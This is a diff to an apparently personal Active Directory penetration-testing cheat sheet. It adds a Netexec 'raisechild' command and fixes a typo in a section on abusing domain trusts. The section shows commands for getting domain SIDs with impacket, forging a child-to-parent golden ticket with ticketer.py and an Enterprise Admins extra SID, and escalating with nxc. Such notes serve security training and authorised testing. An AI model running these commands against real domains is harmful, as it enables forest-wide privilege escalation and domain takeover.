@@ -136,11 +136,13 @@ Enter-PSSession {PSSession_ID_returned}
 
 **Abusing Domain Trusts**
 - Remember here that since we're using kerberos we have to use DNS instead of IPs
-- Gettind SIDs
+- Getting SIDs
 	- Domain SIDs are often needed for tickets, so we use impacket's `lookupsid.py`
 		- `lookupsid.py -domain-sids {domain_user_domain}/{domain_user}:{password}@{target_dc_IP} 0`
 - Golden ticket using child domain
   - If a parent domain trusts us as a child domain, we can use this to create a golden ticket with SIDs in the ticket's Privilege Attribute Certificate (PAC)
+    - Netexec now actually supports this with `-M raisechild`
+      - `nxc ldap {child_dc_IP} -u {username} -p {password} -M raisechild`
   - `ticketer.py` can use `krbtgt`'s nthash to create a golden ticket
     - `ticketer.py -nthash {child_krbtgt_nthash} -domain {child_domain} -domain-sid {child_domain_sid} -extra-sid {parent_domain_sid}-519 fakeuser`
       - To get the parent domain's sid, we can use `Get-ADDomain -Identity {domain_name}`
